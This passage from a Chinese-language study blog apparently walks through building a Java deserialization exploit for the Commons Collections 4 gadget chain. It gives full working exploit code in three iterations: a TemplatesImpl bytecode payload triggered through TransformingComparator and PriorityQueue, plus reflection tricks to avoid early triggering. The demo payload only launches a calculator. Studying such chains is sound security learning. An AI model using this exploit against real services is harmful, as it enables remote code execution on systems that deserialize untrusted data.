+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections4.functors.InstantiateTransformer;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.xml.transform.Templates;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Field;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Files;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Paths;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.PriorityQueue;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>test</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>serialize</span>(Object obj) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(<span style=color:#66d9ef>new</span> FileOutputStream(<span style=color:#e6db74>&#34;ser.bin&#34;</span>));
+</span></span><span style=display:flex><span>        oos.<span style=color:#a6e22e>writeObject</span>(obj);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>unserialize</span>(String filename) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(<span style=color:#66d9ef>new</span> FileInputStream(filename));
+</span></span><span style=display:flex><span>        ois.<span style=color:#a6e22e>readObject</span>();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        TemplatesImpl templates <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TemplatesImpl();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> TemplatesImpl<span style=color:#f92672>&gt;</span> templatesClass <span style=color:#f92672>=</span> templates.<span style=color:#a6e22e>getClass</span>();
+</span></span><span style=display:flex><span>        Field name <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_name&#34;</span>);
+</span></span><span style=display:flex><span>        name.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        name.<span style=color:#a6e22e>set</span>(templates,<span style=color:#e6db74>&#34;abc&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field bytecodes <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_bytecodes&#34;</span>);
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> evil <span style=color:#f92672>=</span> Files.<span style=color:#a6e22e>readAllBytes</span>(Paths.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;C:\\Users\\32202\\Desktop\\CC4\\target\\classes\\org\\example\\calcexp\\Calc.class&#34;</span>));
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span> codes<span style=color:#f92672>=</span>{evil};
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>set</span>(templates,codes);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field tfactory <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_tfactory&#34;</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>set</span>(templates,<span style=color:#66d9ef>new</span> TransformerFactoryImpl());
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        InstantiateTransformer<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span> instantiateTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InstantiateTransformer<span style=color:#f92672>&lt;&gt;</span>(<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{Templates.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{templates});
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//instantiateTransformer.transform(TrAXFilter.class);</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span>{
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ConstantTransformer(TrAXFilter.<span style=color:#a6e22e>class</span>),
+</span></span><span style=display:flex><span>                instantiateTransformer
+</span></span><span style=display:flex><span>        };
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer(transformers);
+</span></span><span style=display:flex><span>        TransformingComparator transformingComparator <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TransformingComparator<span style=color:#f92672>&lt;&gt;</span>(chainedTransformer);
+</span></span><span style=display:flex><span>        PriorityQueue priorityQueue <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> PriorityQueue<span style=color:#f92672>&lt;&gt;</span>(transformingComparator);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        serialize(priorityQueue);
+</span></span><span style=display:flex><span>        unserialize(<span style=color:#e6db74>&#34;ser.bin&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>但是这并没有弹出计算器，也没有抛异常。这应该是因为中间某个步骤直接退出程序了。</p><p>打断点调试后发现是在<code>heapify()</code>方法中跳出程序：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>heapify</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> (size <span style=color:#f92672>&gt;&gt;&gt;</span> 1) <span style=color:#f92672>-</span> 1; i <span style=color:#f92672>&gt;=</span> 0; i<span style=color:#f92672>--</span>)
+</span></span><span style=display:flex><span>            siftDown(i, (E) queue<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span>);
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>因为这里有一个<code>size >>> 1</code>，<code>>>></code>是移位运算符，指定移位的位数。</p><p>这里我们需要把<code>size</code>的值进行替换，当<code>size</code>为1时才算成功；当<code>size</code>等于2时才能进入循环。</p><p>我们先看这个<code>size</code>是什么：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#75715e>/**
+</span></span></span><span style=display:flex><span><span style=color:#75715e>     * The number of elements in the priority queue.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>     */</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>int</span> size <span style=color:#f92672>=</span> 0;
+</span></span></code></pre></div><p>从注释可以看出，<code>size</code>是这个优先级队列的长度，我们可以当成数组的长度来理解。所以我们添加以下语句即可：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span>priorityQueue.<span style=color:#a6e22e>add</span>(1);  
+</span></span><span style=display:flex><span>priorityQueue.<span style=color:#a6e22e>add</span>(2);
+</span></span></code></pre></div><p>最终的 EXP：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections4.Transformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections4.comparators.TransformingComparator;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections4.functors.ChainedTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections4.functors.ConstantTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections4.functors.InstantiateTransformer;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.xml.transform.Templates;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Field;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Files;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Paths;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.PriorityQueue;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>test</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>serialize</span>(Object obj) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(<span style=color:#66d9ef>new</span> FileOutputStream(<span style=color:#e6db74>&#34;ser.bin&#34;</span>));
+</span></span><span style=display:flex><span>        oos.<span style=color:#a6e22e>writeObject</span>(obj);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>unserialize</span>(String filename) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(<span style=color:#66d9ef>new</span> FileInputStream(filename));
+</span></span><span style=display:flex><span>        ois.<span style=color:#a6e22e>readObject</span>();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        TemplatesImpl templates <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TemplatesImpl();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> TemplatesImpl<span style=color:#f92672>&gt;</span> templatesClass <span style=color:#f92672>=</span> templates.<span style=color:#a6e22e>getClass</span>();
+</span></span><span style=display:flex><span>        Field name <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_name&#34;</span>);
+</span></span><span style=display:flex><span>        name.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        name.<span style=color:#a6e22e>set</span>(templates,<span style=color:#e6db74>&#34;abc&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field bytecodes <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_bytecodes&#34;</span>);
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> evil <span style=color:#f92672>=</span> Files.<span style=color:#a6e22e>readAllBytes</span>(Paths.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;C:\\Users\\32202\\Desktop\\CC4\\target\\classes\\org\\example\\calcexp\\Calc.class&#34;</span>));
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span> codes<span style=color:#f92672>=</span>{evil};
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>set</span>(templates,codes);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field tfactory <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_tfactory&#34;</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>set</span>(templates,<span style=color:#66d9ef>new</span> TransformerFactoryImpl());
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        InstantiateTransformer<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span> instantiateTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InstantiateTransformer<span style=color:#f92672>&lt;&gt;</span>(<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{Templates.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{templates});
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//instantiateTransformer.transform(TrAXFilter.class);</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span>{
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ConstantTransformer(TrAXFilter.<span style=color:#a6e22e>class</span>),
+</span></span><span style=display:flex><span>                instantiateTransformer
+</span></span><span style=display:flex><span>        };
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer(transformers);
+</span></span><span style=display:flex><span>        TransformingComparator transformingComparator <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TransformingComparator<span style=color:#f92672>&lt;&gt;</span>(chainedTransformer);
+</span></span><span style=display:flex><span>        PriorityQueue priorityQueue <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> PriorityQueue<span style=color:#f92672>&lt;&gt;</span>(transformingComparator);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        priorityQueue.<span style=color:#a6e22e>add</span>(1);
+</span></span><span style=display:flex><span>        priorityQueue.<span style=color:#a6e22e>add</span>(2);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        serialize(priorityQueue);
+</span></span><span style=display:flex><span>        unserialize(<span style=color:#e6db74>&#34;ser.bin&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>虽然成功弹出计算器，但是还是有报错，接下来解决报错的问题。</p><h3 id=处理报错>处理报错
+<a class=anchor href=#%e5%a4%84%e7%90%86%e6%8a%a5%e9%94%99>#</a></h3><p>当我们执行<code>priorityQueue.add(1)</code>时，在<code>add()</code>方法内调用<code>offer()</code>方法，<code>offer()</code>方法内调用<code>siftUp</code>方法，<code>siftUp()</code>方法内调用<code>siftUpUsingComparator</code>方法，<code>siftUpUsingComparator()</code>方法内部调用了<code>compare()</code>方法，然后调用<code>transform()</code>。</p><p>这就说明，还没到序列化和反序列化，代码已经到弹计算器去了,但是由于<code>_tfactory</code>为空，所以报错。</p><p>因为我们不需要让代码在本地运行，所以我们可以先让<code>transformingComparator</code>的值为一个无关的对象，在<code>add</code>之后再反射修改回来就好了。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections4.Transformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections4.comparators.TransformingComparator;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections4.functors.ChainedTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections4.functors.ConstantTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections4.functors.InstantiateTransformer;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.xml.transform.Templates;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Field;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Files;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Paths;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.PriorityQueue;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>test</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>serialize</span>(Object obj) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(<span style=color:#66d9ef>new</span> FileOutputStream(<span style=color:#e6db74>&#34;ser.bin&#34;</span>));
+</span></span><span style=display:flex><span>        oos.<span style=color:#a6e22e>writeObject</span>(obj);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>unserialize</span>(String filename) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(<span style=color:#66d9ef>new</span> FileInputStream(filename));
+</span></span><span style=display:flex><span>        ois.<span style=color:#a6e22e>readObject</span>();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        TemplatesImpl templates <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TemplatesImpl();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> TemplatesImpl<span style=color:#f92672>&gt;</span> templatesClass <span style=color:#f92672>=</span> templates.<span style=color:#a6e22e>getClass</span>();
+</span></span><span style=display:flex><span>        Field name <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_name&#34;</span>);
+</span></span><span style=display:flex><span>        name.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        name.<span style=color:#a6e22e>set</span>(templates,<span style=color:#e6db74>&#34;abc&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field bytecodes <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_bytecodes&#34;</span>);
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> evil <span style=color:#f92672>=</span> Files.<span style=color:#a6e22e>readAllBytes</span>(Paths.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;C:\\Users\\32202\\Desktop\\CC4\\target\\classes\\org\\example\\calcexp\\Calc.class&#34;</span>));
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span> codes<span style=color:#f92672>=</span>{evil};
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>set</span>(templates,codes);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>/*Field tfactory = templatesClass.getDeclaredField(&#34;_tfactory&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#75715e>        tfactory.setAccessible(true);
+</span></span></span><span style=display:flex><span><span style=color:#75715e>        tfactory.set(templates,new TransformerFactoryImpl());*/</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        InstantiateTransformer<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span> instantiateTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InstantiateTransformer<span style=color:#f92672>&lt;&gt;</span>(<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{Templates.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{templates});
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//instantiateTransformer.transform(TrAXFilter.class);</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span>{
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ConstantTransformer(TrAXFilter.<span style=color:#a6e22e>class</span>),
+</span></span><span style=display:flex><span>                instantiateTransformer
+</span></span><span style=display:flex><span>        };
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer(transformers);
+</span></span><span style=display:flex><span>        TransformingComparator transformingComparator <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TransformingComparator<span style=color:#f92672>&lt;&gt;</span>(<span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>&lt;&gt;</span>(1));
+</span></span><span style=display:flex><span>        PriorityQueue priorityQueue <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> PriorityQueue<span style=color:#f92672>&lt;&gt;</span>(transformingComparator);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        priorityQueue.<span style=color:#a6e22e>add</span>(1);
+</span></span><span style=display:flex><span>        priorityQueue.<span style=color:#a6e22e>add</span>(2);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> TransformingComparator<span style=color:#f92672>&gt;</span> c <span style=color:#f92672>=</span> transformingComparator.<span style=color:#a6e22e>getClass</span>();
+</span></span><span style=display:flex><span>        Field transformer <span style=color:#f92672>=</span> c.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;transformer&#34;</span>);
+</span></span><span style=display:flex><span>        transformer.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        transformer.<span style=color:#a6e22e>set</span>(transformingComparator,chainedTransformer);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        serialize(priorityQueue);
+</span></span><span style=display:flex><span>        unserialize(<span style=color:#e6db74>&#34;ser.bin&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=总结>总结
+<a class=anchor href=#%e6%80%bb%e7%bb%93>#</a></h2><p>其实 CC 链学到这我还是有一点懵的，因为中间有些问题我不太清楚，但是基本的链子我是已经搞明白了，后续就是多练，上手之后相信会好很多。</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#cc4-链分析>CC4 链分析</a></li><li><a href=#逐步编写-exp>逐步编写 EXP</a><ul><li><a href=#初步编写>初步编写</a></li><li><a href=#处理报错>处理报错</a></li></ul></li><li><a href=#总结>总结</a></li></ul></nav></div></aside></main><script>(function(){var e,n,t=document.querySelector(".homepage-tree");t&&t.addEventListener("click",function(e){var t,n,s,i=e.target.closest(".home-tree-toggle"),a=e.target.closest(".home-section-label"),o=i||a;if(!o)return;if(s=o.closest("li"),!s)return;if(n=s.querySelector(".home-tree-children"),t=s.querySelector(".home-tree-toggle"),!n||!t)return;e.preventDefault(),n.classList.contains("hidden")?(n.classList.remove("hidden"),t.classList.remove("collapsed"),t.classList.add("expanded")):(n.classList.add("hidden"),t.classList.remove("expanded"),t.classList.add("collapsed"))}),e=document.createElement("div"),e.className="preview-tooltip",document.body.appendChild(e),document.querySelectorAll(".home-article-link[data-summary]").forEach(function(t){t.addEventListener("mouseenter",function(s){if(window.innerWidth<=768)return;var o=t.getAttribute("data-summary");if(!o)return;n=setTimeout(function(){var t,n,i=o.length>200?o.substring(0,200)+"...":o;e.textContent=i,e.style.display="block",t=s.clientX+15,n=s.clientY+15,t+420>window.innerWidth&&(t=s.clientX-420-15),n+100>window.innerHeight&&(n=s.clientY-100),e.style.left=t+"px",e.style.top=n+"px"},500)}),t.addEventListener("mouseleave",function(){clearTimeout(n),e.style.display="none"})})})()</script></body></html>
